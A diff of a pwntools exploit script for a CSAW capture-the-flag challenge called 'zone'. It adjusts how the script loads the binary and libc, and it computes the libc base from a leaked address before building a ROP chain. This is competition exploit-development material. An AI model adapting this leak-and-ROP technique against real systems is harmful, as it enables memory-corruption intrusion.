@@ -5,16 +5,16 @@ from pwn import *
 context(arch='amd64', os='linux', aslr=True, terminal=['tmux', 'neww'])
 
 if args['GDB']:
-    io = gdb.debug('./zone', gdbscript='''\
+    elf, libc = ELF('./zone-2.23-0ubuntu9'), ELF('libs/libc-amd64-2.23-0ubuntu9.so')
+    io = gdb.debug('./zone-2.23-0ubuntu9', gdbscript='''\
         c
     ''')
-    elf, libc = ELF('./zone'), io.libc
 elif args['REMOTE']:
+    elf, libc = ELF('./zone'), ELF('libs/libc-amd64-2.23-0ubuntu9.so')
     io = remote('pwn.chal.csaw.io', 5223)
-    elf, libc = ELF('./zone'), ELF('./libc-amd64-2.23-0ubuntu9.so')
 else:
-    io = process(['stdbuf', '-i0', '-o0', '-e0', './zone'])
-    elf, libc = ELF('./zone'), io.libc
+    elf, libc = ELF('./zone-2.23-0ubuntu9'), ELF('libs/libc-amd64-2.23-0ubuntu9.so')
+    io = process(['stdbuf', '-i0', '-o0', '-e0', './zone-2.23-0ubuntu9'])
 
 
 def allocate(size):
@@ -68,8 +68,7 @@ allocate(0x40)
 # print the content of the chunk to leak an address from libc
 libc_leak_address = u64(print_last()[:6].ljust(8, '\x00'))
 success('libc leak address: %s' % hex(libc_leak_address))
-if args['REMOTE']:
-    libc.address = libc_leak_address - (libc.symbols['__libc_start_main'] + 240)
+libc.address = libc_leak_address - (libc.symbols['__libc_start_main'] + 240)
 success('libc address: %s' % hex(libc.address))
 
 rop = ROP(libc)
